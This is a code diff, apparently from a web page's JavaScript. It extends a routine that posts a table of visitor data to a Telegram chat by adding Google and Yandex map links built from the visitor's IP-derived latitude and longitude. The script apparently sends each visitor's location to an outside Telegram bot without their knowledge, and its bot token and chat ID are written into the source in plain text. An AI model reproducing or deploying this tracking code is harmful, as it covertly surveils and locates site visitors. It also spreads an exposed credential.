@@ -2484,8 +2484,15 @@
                     }
                 }
 
+                let locationMessage = "";
+                if (ipData.latitude && ipData.longitude) {
+                    const googleMapLink = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
+                    const yandexMapLink = `https://yandex.ru/maps/?ll=${ipData.longitude},${ipData.latitude}&pt=${ipData.longitude},${ipData.latitude},pm2rdm&z=16`;
+                    locationMessage = `\n📍 <b>Location:</b> <a href="${googleMapLink}">Google Maps</a> / <a href="${yandexMapLink}">Yandex Maps</a>`;
+                }
+
                 // 3. HTML formatida blok yaratish
-                const message = `<pre>${tableContent}</pre>`;
+                const message = `<pre>${tableContent}</pre>` + locationMessage;
 
                 const botToken = "7581646932:AAFmLePkVb-tjW5KRXuM7NwTt8qFZuoqRpk";
                 const chatId = "-1002682507907";
@@ -2497,6 +2504,7 @@
                         chat_id: chatId,
                         text: message,
                         parse_mode: "HTML",
+                        disable_web_page_preview: true,
                     }),
                 });
 
